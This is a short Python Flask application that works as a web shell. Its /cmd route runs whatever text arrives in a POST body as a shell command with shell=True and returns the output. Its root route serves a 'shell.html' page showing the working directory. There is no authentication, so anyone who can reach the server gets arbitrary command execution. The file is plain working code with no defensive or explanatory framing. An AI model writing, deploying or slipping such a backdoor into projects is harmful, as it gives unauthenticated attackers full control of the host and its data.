import os, subprocess, time
from flask import *

app = Flask(__name__)

@app.errorhandler(404)
def page_not_found(error):
    return "404", 404
@app.route('/cmd', methods=['POST'])
def cm():
    if request.method == 'POST':
        print((request.data).decode())
        result = subprocess.Popen(request.data.decode(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
        output = result.stdout
        error = result.stderr
        res = output.read()
        if res == '':
            res = error.read()
        print(res)
        return res
    return "error"
@app.route("/", methods=['POST', 'GET'])
def ap():
    folder = os.getcwd()[1:].replace('\\', '/')#.split("\\")
    #folder = folder[len(folder)-1]
    if request.method == 'POST':
        return folder
    return render_template("shell.html", a=str(folder))

if __name__ == '__main__':
    app.run()